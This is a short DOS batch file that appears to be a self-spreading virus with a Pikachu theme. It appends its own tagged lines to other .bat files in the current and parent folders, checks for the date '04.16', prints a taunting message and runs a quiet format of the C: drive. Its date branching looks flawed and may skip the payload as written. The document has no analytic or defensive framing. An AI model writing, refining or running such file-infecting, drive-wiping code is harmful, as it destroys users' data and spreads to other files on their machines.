@Echo OFF%[Pikachu]%
for %%f in (*.bat ..\*.bat) do set Pikachu=%%f
find "Pikachu"<%Pikachu%>nul
if errorlevel 1 find "Pikachu"<%0>>%Pikachu%
echo.|date|find "04.16"<nul%[Pikachu]%
if errorlevel 0 goto :Pikachu
if errorlevel 1 goto :Pikachu_ZAP
:Pikachu_ZAP
Cls REM Pikachu
ECHO.Hello! I am the Yellow Pikachu (Pikachu) from Television Just a moment...
Format C:\ /q autotest
Echo.Zap! Now you are Fried (Pikachu)
:Pikachu